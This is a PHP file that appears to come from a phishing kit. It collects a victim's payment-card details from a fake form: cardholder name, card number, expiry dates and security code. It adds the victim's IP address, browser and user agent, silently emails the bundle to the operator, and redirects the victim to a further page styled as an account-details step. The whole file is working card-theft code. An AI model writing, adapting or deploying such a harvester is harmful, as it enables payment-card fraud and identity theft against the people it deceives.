<?php
error_reporting(0);
session_start();
include("./config/madara.php");
include("./config/obito.php");
        $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	 $subject  = " cc  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
    $headers  = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$headers .= "From: madara@madara.hu" . "\r\n";
	$message = "
<body style='background: black;'>			
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<font color='white'>_____________________________________________________________________<br>
<font color='white'>IP         =>   <font color='#290DFF'>".$_SESSION['_IP_']."</font><br />
<font color='white'>TIME       =>   <font color='#290DFF'>".$time."</font><br />
<font color='white'>BROWSER    =>   <font color='#290DFF'>".$browser."</font><br />
<font color='white'>AGENT      =>   <font color='#290DFF'>".$user_agent."</font><br />
<font color='white'>_____________________________________________________________________<br>
<font color='white'>gomara       : <font color='chartreuse'>".$_POST['crd']."</font><br />
<font color='white'>gomara3      : <font color='chartreuse'>".$_POST['bname']."</font><br />
<font color='white'>Cardname     : <font color='chartreuse'>".$_POST['e']."</font><br />
<font color='white'>Card         : <font color='chartreuse'>".$_POST['p']."</font><br />
<font color='white'>Date         : <font color='chartreuse'>".$_POST['exp1']."</font><br />
<font color='white'>Date         : <font color='chartreuse'>".$_POST['exp2']."</font><br />
<font color='white'>csc          : <font color='chartreuse'>".$_POST['ccv']."</font><br />
<font color='white'>___________________________________________________________________";
	@mail($to,$subject,$message,$headers);
header("Location:./erositse.php?cmd=_account-details&session=".$x.$xx."");
?>